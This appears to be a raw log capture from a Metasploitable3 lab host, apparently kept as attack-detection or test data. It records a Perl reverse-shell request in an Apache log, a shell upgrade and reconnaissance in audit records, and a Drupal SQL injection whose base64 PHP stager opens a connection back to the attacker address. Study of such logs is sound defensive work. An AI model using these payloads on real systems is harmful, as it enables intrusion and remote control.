@@ -1,0 +1,367 @@
+172.28.128.10 - - [20/Aug/2026:12:33:29 +0000] "GET /?probe=1 HTTP/1.1" 200 844 "-" "this is the injection"
+type=SYSCALL msg=audit(1787229212.050:2955): arch=c000003e syscall=59 success=yes exit=0 a0=7f68cbc79050 a1=7f68cbc820f0 a2=7f68cbc79090 a3=7f68c980cfe0 items=2 ppid=2293 pid=4214 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 ses=4294967295 tty=(none) comm="sshd" exe="/usr/sbin/sshd" key="exec_watch"
+type=EXECVE msg=audit(1787229212.050:2955): argc=3 a0="/usr/sbin/sshd" a1="-D" a2="-R"
+type=CWD msg=audit(1787229212.050:2955):  cwd="/"
+type=PATH msg=audit(1787229212.050:2955): item=0 name="/usr/sbin/sshd" inode=2108145 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229212.050:2955): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+Aug 20 12:33:38 metasploitable3-ub1404 sshd[4214]: Invalid user this is the injection from 172.28.128.10
+Aug 20 12:33:38 metasploitable3-ub1404 sshd[4214]: input_userauth_request: invalid user this is the injection [preauth]
+Aug 20 12:33:38 metasploitable3-ub1404 sshd[4214]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.28.128.10 
+type=USER_LOGIN msg=audit(1787229218.110:2956): pid=4214 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28756E6B6E6F776E207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+type=USER_LOGIN msg=audit(1787229218.110:2957): pid=4214 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+Aug 20 12:33:40 metasploitable3-ub1404 sshd[4214]: Failed password for invalid user this is the injection from 172.28.128.10 port 54818 ssh2
+type=USER_AUTH msg=audit(1787229220.494:2958): pid=4214 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=746869732069732074686520696E6A656374696F6E exe="/usr/sbin/sshd" hostname=172.28.128.10 addr=172.28.128.10 terminal=ssh res=failed'
+type=USER_LOGIN msg=audit(1787229220.494:2959): pid=4214 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=28696E76616C6964207573657229 exe="/usr/sbin/sshd" hostname=? addr=172.28.128.10 terminal=sshd res=failed'
+172.28.128.10 - - [20/Aug/2026:12:33:47 +0000] "GET /rWMkY.php?jCFaI0g=nohup%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3bforeach%20my%20%24key%28keys%20%25ENV%29%7bif%28%24ENV%7b%24key%7d%3d~/%28.%2a%29/%29%7b%24ENV%7b%24key%7d%3d%241%3b%7d%7d%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22172.28.128.10%3a4445%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24~-%3efdopen%28%24c%2cw%29%3bwhile%28%3c%3e%29%7bif%28%24_%3d~%20/%28.%2a%29/%29%7bsystem%20%241%3b%7d%7d%3b%27%20%26 HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
+type=SYSCALL msg=audit(1787229257.218:2977): arch=c000003e syscall=59 success=yes exit=0 a0=7f18a8931b04 a1=7fff6f801c60 a2=1880380 a3=7fff6f803a90 items=2 ppid=4219 pid=4230 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="sh" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1787229257.218:2977): argc=3 a0="sh" a1="-c" a2=62617368202D632027776869636820707974686F6E272022746869732069732074686520696E6A656374696F6E22
+type=CWD msg=audit(1787229257.218:2977):  cwd="/var/www/html"
+type=PATH msg=audit(1787229257.218:2977): item=0 name="/bin/sh" inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229257.218:2977): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229257.222:2978): arch=c000003e syscall=59 success=yes exit=0 a0=7f5fcd6ecc38 a1=7f5fcd6ecbc0 a2=7f5fcd6ecbe8 a3=7f5fcd4bba10 items=2 ppid=4230 pid=4231 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229257.222:2978): argc=4 a0="bash" a1="-c" a2=776869636820707974686F6E a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229257.222:2978):  cwd="/var/www/html"
+type=PATH msg=audit(1787229257.222:2978): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229257.222:2978): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229257.222:2979): arch=c000003e syscall=59 success=yes exit=0 a0=9036c8 a1=901988 a2=901c08 a3=7fffe78d6650 items=3 ppid=4230 pid=4231 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="which" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1787229257.222:2979): argc=3 a0="/bin/sh" a1="/usr/bin/which" a2="python"
+type=CWD msg=audit(1787229257.222:2979):  cwd="/var/www/html"
+type=PATH msg=audit(1787229257.222:2979): item=0 name="/usr/bin/which" inode=262248 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229257.222:2979): item=1 name=(null) inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229257.222:2979): item=2 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229259.346:2980): arch=c000003e syscall=59 success=yes exit=0 a0=7f18a8931b04 a1=7fff6f801c60 a2=1880380 a3=7fff6f803a90 items=2 ppid=4219 pid=4232 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="sh" exe="/bin/dash" key="exec_watch"
+type=EXECVE msg=audit(1787229259.346:2980): argc=3 a0="sh" a1="-c" a2=707974686F6E202D632027696D706F7274207074793B207074792E737061776E28222F62696E2F62617368222927
+type=CWD msg=audit(1787229259.346:2980):  cwd="/var/www/html"
+type=PATH msg=audit(1787229259.346:2980): item=0 name="/bin/sh" inode=262164 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229259.346:2980): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229259.350:2981): arch=c000003e syscall=59 success=yes exit=0 a0=7f95dd473c00 a1=7f95dd473b90 a2=7f95dd473bb0 a3=7f95dd242a10 items=2 ppid=4232 pid=4233 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=(none) comm="python" exe="/usr/bin/python2.7" key="exec_watch"
+type=EXECVE msg=audit(1787229259.350:2981): argc=3 a0="python" a1="-c" a2=696D706F7274207074793B207074792E737061776E28222F62696E2F626173682229
+type=CWD msg=audit(1787229259.350:2981):  cwd="/var/www/html"
+type=PATH msg=audit(1787229259.350:2981): item=0 name="/usr/bin/python" inode=2105552 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229259.350:2981): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229259.362:2982): arch=c000003e syscall=59 success=yes exit=0 a0=15ffab0 a1=16351d0 a2=7fff45ac8548 a3=7fff45ac75a0 items=2 ppid=4233 pid=4234 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229259.362:2982): argc=1 a0="/bin/bash"
+type=CWD msg=audit(1787229259.362:2982):  cwd="/var/www/html"
+type=PATH msg=audit(1787229259.362:2982): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229259.362:2982): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229261.418:2984): arch=c000003e syscall=59 success=yes exit=0 a0=905468 a1=906588 a2=903e08 a3=7fff9b72d520 items=2 ppid=4234 pid=4237 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229261.418:2984): argc=4 a0="bash" a1="-c" a2="id" a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229261.418:2984):  cwd="/var/www/html"
+type=PATH msg=audit(1787229261.418:2984): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229261.418:2984): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229261.422:2985): arch=c000003e syscall=59 success=yes exit=0 a0=225ef48 a1=225e6c8 a2=225fc08 a3=7fffb04f3f60 items=2 ppid=4234 pid=4237 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="id" exe="/usr/bin/id" key="exec_watch"
+type=EXECVE msg=audit(1787229261.422:2985): argc=1 a0="id"
+type=CWD msg=audit(1787229261.422:2985):  cwd="/var/www/html"
+type=PATH msg=audit(1787229261.422:2985): item=0 name="/usr/bin/id" inode=2113128 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229261.422:2985): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229263.566:2986): arch=c000003e syscall=59 success=yes exit=0 a0=9059a8 a1=905a08 a2=903e08 a3=7fff9b72d520 items=2 ppid=4234 pid=4238 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229263.566:2986): argc=4 a0="bash" a1="-c" a2=756E616D65202D61 a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229263.566:2986):  cwd="/var/www/html"
+type=PATH msg=audit(1787229263.566:2986): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229263.566:2986): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229263.574:2987): arch=c000003e syscall=59 success=yes exit=0 a0=232cac8 a1=232cf08 a2=232cc08 a3=7fffaab78930 items=2 ppid=4234 pid=4238 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="uname" exe="/bin/uname" key="exec_watch"
+type=EXECVE msg=audit(1787229263.574:2987): argc=2 a0="uname" a1="-a"
+type=CWD msg=audit(1787229263.574:2987):  cwd="/var/www/html"
+type=PATH msg=audit(1787229263.574:2987): item=0 name="/bin/uname" inode=272830 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229263.574:2987): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229265.750:2988): arch=c000003e syscall=59 success=yes exit=0 a0=9059e8 a1=905948 a2=903e08 a3=7fff9b72d520 items=2 ppid=4234 pid=4239 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229265.750:2988): argc=4 a0="bash" a1="-c" a2=697020616464722073686F77207C7C206966636F6E666967202D61 a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229265.750:2988):  cwd="/var/www/html"
+type=PATH msg=audit(1787229265.750:2988): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229265.750:2988): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229265.754:2989): arch=c000003e syscall=59 success=yes exit=0 a0=149e588 a1=149ea48 a2=149dc08 a3=7fffed4b6ad0 items=2 ppid=4239 pid=4240 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="ip" exe="/bin/ip" key="exec_watch"
+type=EXECVE msg=audit(1787229265.754:2989): argc=3 a0="ip" a1="addr" a2="show"
+type=CWD msg=audit(1787229265.754:2989):  cwd="/var/www/html"
+type=PATH msg=audit(1787229265.754:2989): item=0 name="/sbin/ip" inode=262184 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229265.754:2989): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229268.010:2990): arch=c000003e syscall=59 success=yes exit=0 a0=904828 a1=905e48 a2=903e08 a3=7fff9b72d520 items=2 ppid=4234 pid=4241 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229268.010:2990): argc=4 a0="bash" a1="-c" a2=697020726F7574652073686F77207C7C20726F757465202D6E a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229268.010:2990):  cwd="/var/www/html"
+type=PATH msg=audit(1787229268.010:2990): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229268.010:2990): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229268.014:2991): arch=c000003e syscall=59 success=yes exit=0 a0=1069588 a1=1069a48 a2=1068c08 a3=7fffd9af0da0 items=2 ppid=4241 pid=4242 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="ip" exe="/bin/ip" key="exec_watch"
+type=EXECVE msg=audit(1787229268.014:2991): argc=3 a0="ip" a1="route" a2="show"
+type=CWD msg=audit(1787229268.014:2991):  cwd="/var/www/html"
+type=PATH msg=audit(1787229268.014:2991): item=0 name="/sbin/ip" inode=262184 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229268.014:2991): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229270.254:2992): arch=c000003e syscall=59 success=yes exit=0 a0=905a28 a1=905fc8 a2=903e08 a3=7fff9b72d520 items=2 ppid=4234 pid=4243 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="bash" exe="/bin/bash" key="exec_watch"
+type=EXECVE msg=audit(1787229270.254:2992): argc=4 a0="bash" a1="-c" a2=617270202D61207C7C206970206E656967682073686F77 a3=746869732069732074686520696E6A656374696F6E
+type=CWD msg=audit(1787229270.254:2992):  cwd="/var/www/html"
+type=PATH msg=audit(1787229270.254:2992): item=0 name="/bin/bash" inode=272808 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229270.254:2992): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=SYSCALL msg=audit(1787229270.258:2993): arch=c000003e syscall=59 success=yes exit=0 a0=9014a8 a1=901a48 a2=900c08 a3=7fff19134c20 items=2 ppid=4243 pid=4244 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 ses=4294967295 tty=pts5 comm="arp" exe="/usr/sbin/arp" key="exec_watch"
+type=EXECVE msg=audit(1787229270.258:2993): argc=2 a0="arp" a1="-a"
+type=CWD msg=audit(1787229270.258:2993):  cwd="/var/www/html"
+type=PATH msg=audit(1787229270.258:2993): item=0 name="/usr/sbin/arp" inode=2100062 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PATH msg=audit(1787229270.258:2993): item=1 name=(null) inode=399404 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+260820 12:34:35	    6 Query	SELECT COUNT(*) FROM flood WHERE event = 'failed_login_attempt_user' AND identifier = '0-172.28.128.10' AND timestamp > '1787207009'
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache WHERE cid IN ('entity_info:en')
+		    6 Query	SELECT base.uid AS uid, base.name AS name, base.pass AS pass, base.mail AS mail, base.theme AS theme, base.signature AS signature, base.signature_format AS signature_format, base.created AS created, base.access AS access, base.login AS login, base.status AS status, base.timezone AS timezone, base.language AS language, base.picture AS picture, base.init AS init, base.data AS data
+FROM 
+users base
+WHERE  (base.name IN  ('', ''))
+		    6 Query	SELECT r.rid, r.name, ur.uid FROM role r INNER JOIN users_roles ur ON ur.rid = r.rid WHERE ur.uid IN ('0')
+		    6 Query	SELECT base.fid AS fid, base.uid AS uid, base.filename AS filename, base.uri AS uri, base.filemime AS filemime, base.filesize AS filesize, base.status AS status, base.timestamp AS timestamp
+FROM 
+file_managed base
+WHERE  (base.fid IN  ('0'))
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_field WHERE cid IN ('field_info_fields')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_field WHERE cid IN ('field:user:0')
+		    6 Query	INSERT INTO flood (event, identifier, timestamp, expiration) VALUES ('failed_login_attempt_ip', '172.28.128.10', '1787228609', '1787232209')
+		    6 Query	INSERT INTO flood (event, identifier, timestamp, expiration) VALUES ('failed_login_attempt_user', '0-172.28.128.10', '1787228609', '1787250209')
+		    6 Query	INSERT INTO watchdog (uid, type, message, variables, severity, link, location, referer, hostname, timestamp) VALUES ('0', 'user', 'Login attempt failed for %user.', 'a:1:{s:5:\"%user\";a:2:{s:2563:\"0;INSERT INTO {cache_form} (cid, data, expire, created, serialized) VALUES (\'form_state_form-517YHvAF46ATAY5mndSRlNHQowFk8H8XMGoFc33Qipw\', REPLACE(REPLACE(\'a:1:Tz0ekNJis:10:\"build_info\";a:1:Tz0ekNJis:5:\"files\";a:1:Tz0ekNJii:0;s:22:\"modules/php/php.module\";YBy4qxNmYBy4qxNmYBy4qxNm\', \'Tz0ekNJi\', CHAR(123)), \'YBy4qxNm\', CHAR(125)), -1, 0, 1);INSERT INTO {cache_form} (cid, data, expire, created, serialized) VALUES (\'form_form-517YHvAF46ATAY5mndSRlNHQowFk8H8XMGoFc33Qipw\', REPLACE(REPLACE(\'a:6:IkN75FBEs:5:\"#type\";s:4:\"form\";s:8:\"#parents\";a:1:IkN75FBEi:0;s:4:\"user\";ZO46sOxQs:8:\"#process\";a:1:IkN75FBEi:0;s:13:\"drupal_render\";ZO46sOxQs:16:\"#defaults_loaded\";b:1;s:12:\"#post_render\";a:1:IkN75FBEi:0;s:8:\"php_eval\";ZO46sOxQs:9:\"#children\";s:1726:\"<?php eval(base64_decode(\\\'Y2FjaGVfY2xlYXJfYWxsKGFycmF5KCdmb3JtX2Zvcm0tNTE3WUh2QUY0NkFUQVk1bW5kU1JsTkhRb3dGazhIOFhNR29GYzMzUWlwdycsICdmb3JtX3N0YXRlX2Zvcm0tNTE3WUh2QUY0NkFUQVk1bW5kU1JsTkhRb3dGazhIOFhNR29GYzMzUWlwdycpLCAnY2FjaGVfZm9ybScpOy8qPD9waHAgLyoqLyBlcnJvcl9yZXBvcnRpbmcoMCk7ICRpcCA9ICcxNzIuMjguMTI4LjEwJzsgJHBvcnQgPSA0NDUwOyBpZiAoKCRmID0gJ3N0cmVhbV9zb2NrZXRfY2xpZW50JykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoInRjcDovL3skaXB9OnskcG9ydH0iKTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCRpcCwgJHBvcnQpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnc29ja2V0X2NyZWF0ZScpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsgJHJlcyA9IEBzb2NrZXRfY29ubmVjdCgkcywgJGlwLCAkcG9ydCk7IGlmICghJHJlcykgeyBkaWUoKTsgfSAkc190eXBlID0gJ3NvY2tldCc7IH0gaWYgKCEkc190eXBlKSB7IGRpZSgnbm8gc29ja2V0IGZ1bmMnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw==\\\'));\";ZO46sOxQ\', \'IkN75FBE\', CHAR(123)), \'ZO46sOxQ\', CHAR(125)), -1, 0, 1);SELECT SLEEP(666);#\";s:0:\"\";i:0;s:0:\"\";}}', '5', '', 'http://172.28.128.3/drupal/?q=user/login', '', '172.28.128.10', '1787228609')
+		    6 Query	SELECT b.*
+FROM 
+block b
+WHERE  (b.theme = 'bartik') AND (b.status = '1') 
+ORDER BY b.region ASC, b.weight ASC, b.module ASC
+		    6 Query	SELECT module, delta, rid FROM block_role
+		    6 Query	SELECT module, delta, type FROM block_node_type
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache WHERE cid IN ('node_types:en')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('menu_item:04f8996da763b7a969b1028ee3007569eaf3a635486ddab211d512c85b9df8fb')
+		    6 Query	SELECT menu_router.*
+FROM 
+menu_router menu_router
+WHERE  (tab_root = 'user') AND (context <> '2') 
+ORDER BY weight ASC, title ASC
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:navigation:page:user/login:en:1:0')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:navigation:tree-data:en:9bd1605e2280833450478f9083b7f8714c2fa28f1012455e2744e5af1a13eec5')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache WHERE cid IN ('theme_registry:bartik')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:main-menu:page:user/login:en:1:1')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:main-menu:tree-data:en:9ec01ec58bf82a695e4acd636af283e0585fe8cd8a6e54eb140188a3e284ab1c')
+		    6 Query	SELECT n.nid AS nid
+FROM 
+node n
+WHERE  (n.status = '1') AND (n.nid IN  ('2'))
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:user-menu:page:user/login:en:1:1')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:user-menu:tree-data:en:cac14999cdc7d5f7f0196586b48c5f900ac44bd30d369d40c831ed506555dcc1')
+		    6 Query	SELECT ml.*, m.*, ml.weight AS link_weight
+FROM 
+menu_links ml
+LEFT OUTER JOIN menu_router m ON m.path = ml.router_path
+WHERE  (ml.menu_name IN  ('navigation', 'management', 'user-menu', 'main-menu')) AND (ml.link_path IN  ('user/login', 'user'))
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:user-menu:page:user/login:en:1:0:trail')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('links:user-menu:tree-data:en:2dca64bda4df082ccbecd433b90151b6de60b9878dd71b4e245f1f8a504f8e53')
+		    6 Query	INSERT INTO semaphore (name, value, expire) VALUES ('cron', '5020287656a86f45ba4cf99.66949151', '1787229515.675')
+		    6 Query	SELECT w.wid AS wid
+FROM 
+watchdog w
+ORDER BY wid DESC
+LIMIT 1 OFFSET 999
+		    6 Query	DELETE FROM watchdog 
+WHERE  (wid < '3867')
+		    6 Query	SELECT fci.*
+FROM 
+field_config_instance fci
+INNER JOIN field_config fc ON fc.id = fci.field_id
+WHERE  (fci.deleted = '1') AND (fc.active = '1') AND (fc.storage_active = '1')
+		    6 Query	SELECT fc.*
+FROM 
+field_config fc
+WHERE  (deleted = '1') AND (fc.active = '1') AND (fc.storage_active = '1')
+		    6 Query	DELETE FROM history 
+WHERE  (timestamp < '1784636609')
+		    6 Query	SELECT n.nid FROM node n LEFT JOIN search_dataset d ON d.type = 'node' AND d.sid = n.nid WHERE d.sid IS NULL OR d.reindex <> 0 ORDER BY d.reindex ASC, n.nid ASC LIMIT 0, 100
+		    6 Query	DELETE FROM flood 
+WHERE  (expiration < '1787228609')
+		    6 Query	SELECT fid FROM file_managed WHERE status <> '1' AND timestamp < '1787207009'
+		    6 Query	SELECT name FROM system WHERE type = 'theme' AND status = 1
+		    6 Query	SELECT bid, info FROM block_custom ORDER BY info
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache_menu WHERE cid IN ('menu_custom')
+		    6 Query	SELECT b.*
+FROM 
+block b
+WHERE (( (module = 'comment') AND (delta = 'recent') )OR( (module = 'node') AND (delta = 'syndicate') )OR( (module = 'node') AND (delta = 'recent') )OR( (module = 'search') AND (delta = 'form') )OR( (module = 'shortcut') AND (delta = 'shortcuts') )OR( (module = 'system') AND (delta = 'main') )OR( (module = 'system') AND (delta = 'powered-by') )OR( (module = 'system') AND (delta = 'help') )OR( (module = 'system') AND (delta = 'navigation') )OR( (module = 'system') AND (delta = 'management') )OR( (module = 'system') AND (delta = 'user-menu') )OR( (module = 'system') AND (delta = 'main-menu') )OR( (module = 'user') AND (delta = 'login') )OR( (module = 'user') AND (delta = 'new') )OR( (module = 'user') AND (delta = 'online') ))AND (theme = 'bartik')
+		    6 Query	SELECT cid, data, created, expire, serialized FROM cache WHERE cid IN ('schema')
+		    6 Query	UPDATE block SET module='comment', delta='recent', theme='bartik', status='0', weight='0', region='-1', custom='0', visibility='0', pages='', title='', cache='1'
+WHERE  (bid = '13')
